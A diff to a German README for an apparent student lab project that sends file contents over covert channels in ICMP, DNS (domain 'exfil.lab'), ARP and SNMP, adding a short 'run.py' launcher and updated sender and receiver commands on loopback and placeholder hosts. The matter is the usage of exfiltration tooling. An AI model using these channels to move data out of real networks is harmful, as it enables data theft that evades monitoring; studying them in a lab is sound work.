@@ -49,6 +49,49 @@ Wichtig:
 
 - diese Tests ersetzen **nicht** den echten End-to-End-Lauf auf deinem Zielsystem
 
+## Kurzbefehle
+
+Wenn du die langen CLI-Kommandos abkürzen willst, kannst du stattdessen den Repo-Launcher `run.py` verwenden.
+
+Format:
+
+```bash
+python run.py <rolle> <protokoll> "<iface>" <peer-ip> "<psk>"
+```
+
+Rollen:
+
+- `s` oder `sender`
+- `r` oder `receiver`
+
+Protokolle:
+
+- `i` oder `icmp`
+- `d` oder `dns`
+- `a` oder `arp`
+- `s` oder `snmp`
+
+Beispiele:
+
+```bash
+python run.py r i "\Device\NPF_Loopback" 127.0.0.1 "lab-shared-key"
+python run.py s i "\Device\NPF_Loopback" 127.0.0.1 "lab-shared-key"
+```
+
+Der Launcher setzt automatisch diese Defaults:
+
+- Sender-Input: `data/input.txt`
+- Receiver-Output: `receiver/output/output_<methode>.txt`
+- Sender-PCAP: `captures/sender_<methode>.pcap`
+- Receiver-PCAP: `captures/receiver_<methode>.pcap`
+- DNS-Port: `5300`
+- DNS-Domain: `exfil.lab`
+- SNMP-Port: `1161`
+- SNMP-Community: `public`
+- SNMP-OID: `1.3.6.1.4.1.55555.1.0`
+
+Die langen Original-Kommandos funktionieren weiterhin unverändert.
+
 ## Empfohlener Demo-Pfad
 
 Für einen einzelnen Windows-Rechner ist aktuell `ICMP` über das Npcap-Loopback-Interface der belastbarste lokale Testpfad.
@@ -57,21 +100,37 @@ Beispiel auf demselben Gerät:
 
 Terminal 1, Receiver:
 
+Kurzbefehl:
+
 ```bash
-python -m receiver.main --method icmp --iface "\Device\NPF_Loopback" --peer 127.0.0.1 --out receiver/output/output.txt --psk "lab-shared-key" --pcap captures/receiver_capture.pcap --log-level INFO
+python run.py r i "\Device\NPF_Loopback" 127.0.0.1 "lab-shared-key"
+```
+
+Originalkommando:
+
+```bash
+python -m receiver.main --method icmp --iface "\Device\NPF_Loopback" --peer 127.0.0.1 --out receiver/output/output_icmp.txt --psk "lab-shared-key" --pcap captures/receiver_icmp.pcap --log-level INFO
 ```
 
 Terminal 2, Sender:
 
+Kurzbefehl:
+
 ```bash
-python -m sender.main --method icmp --iface "\Device\NPF_Loopback" --peer 127.0.0.1 --in data/input.txt --psk "lab-shared-key" --pcap captures/sender_capture.pcap --log-level INFO
+python run.py s i "\Device\NPF_Loopback" 127.0.0.1 "lab-shared-key"
+```
+
+Originalkommando:
+
+```bash
+python -m sender.main --method icmp --iface "\Device\NPF_Loopback" --peer 127.0.0.1 --in data/input.txt --psk "lab-shared-key" --pcap captures/sender_icmp.pcap --log-level INFO
 ```
 
 Erwartetes Ergebnis:
 
 - Sender meldet `Transfer complete`
 - Receiver zeigt den rekonstruierten Text auf dem Bildschirm
-- Receiver schreibt die Datei `receiver/output/output.txt`
+- Receiver schreibt die Datei `receiver/output/output_icmp.txt`
 - beide Programme erzeugen eine `.pcap`
 
 ## Lokales Testen je Methode
@@ -89,9 +148,18 @@ Erwartetes Ergebnis:
 
 Beispiel:
 
+Kurzbefehle:
+
 ```bash
-python -m receiver.main --method dns --iface <IFACE> --peer <SENDER-IP> --out receiver/output/output.txt --psk "lab-shared-key" --dns-domain exfil.lab --dns-port 5300 --pcap captures/receiver_dns.pcap
-python -m sender.main --method dns --iface <IFACE> --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --dns-domain exfil.lab --dns-port 5300 --pcap captures/sender_dns.pcap
+python run.py r d "<IFACE>" <SENDER-IP> "lab-shared-key"
+python run.py s d "<IFACE>" <RECEIVER-IP> "lab-shared-key"
+```
+
+Originalkommandos:
+
+```bash
+python -m receiver.main --method dns --iface "<IFACE>" --peer <SENDER-IP> --out receiver/output/output_dns.txt --psk "lab-shared-key" --dns-domain exfil.lab --dns-port 5300 --pcap captures/receiver_dns.pcap --log-level INFO
+python -m sender.main --method dns --iface "<IFACE>" --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --dns-domain exfil.lab --dns-port 5300 --pcap captures/sender_dns.pcap --log-level INFO
 ```
 
 ### SNMP
@@ -102,9 +170,18 @@ python -m sender.main --method dns --iface <IFACE> --peer <RECEIVER-IP> --in dat
 
 Beispiel:
 
+Kurzbefehle:
+
 ```bash
-python -m receiver.main --method snmp --iface <IFACE> --peer <SENDER-IP> --out receiver/output/output.txt --psk "lab-shared-key" --snmp-community public --snmp-port 1161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/receiver_snmp.pcap
-python -m sender.main --method snmp --iface <IFACE> --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --snmp-community public --snmp-port 1161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/sender_snmp.pcap
+python run.py r s "<IFACE>" <SENDER-IP> "lab-shared-key"
+python run.py s s "<IFACE>" <RECEIVER-IP> "lab-shared-key"
+```
+
+Originalkommandos:
+
+```bash
+python -m receiver.main --method snmp --iface "<IFACE>" --peer <SENDER-IP> --out receiver/output/output_snmp.txt --psk "lab-shared-key" --snmp-community public --snmp-port 1161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/receiver_snmp.pcap --log-level INFO
+python -m sender.main --method snmp --iface "<IFACE>" --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --snmp-community public --snmp-port 1161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/sender_snmp.pcap --log-level INFO
 ```
 
 ### ARP
@@ -114,9 +191,18 @@ python -m sender.main --method snmp --iface <IFACE> --peer <RECEIVER-IP> --in da
 
 Beispiel:
 
+Kurzbefehle:
+
 ```bash
-python -m receiver.main --method arp --iface <IFACE> --peer <SENDER-IP> --out receiver/output/output.txt --psk "lab-shared-key" --pcap captures/receiver_arp.pcap
-python -m sender.main --method arp --iface <IFACE> --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --pcap captures/sender_arp.pcap
+python run.py r a "<IFACE>" <SENDER-IP> "lab-shared-key"
+python run.py s a "<IFACE>" <RECEIVER-IP> "lab-shared-key"
+```
+
+Originalkommandos:
+
+```bash
+python -m receiver.main --method arp --iface "<IFACE>" --peer <SENDER-IP> --out receiver/output/output_arp.txt --psk "lab-shared-key" --pcap captures/receiver_arp.pcap --log-level INFO
+python -m sender.main --method arp --iface "<IFACE>" --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --pcap captures/sender_arp.pcap --log-level INFO
 ```
 
 ## Abgabe-Checkliste
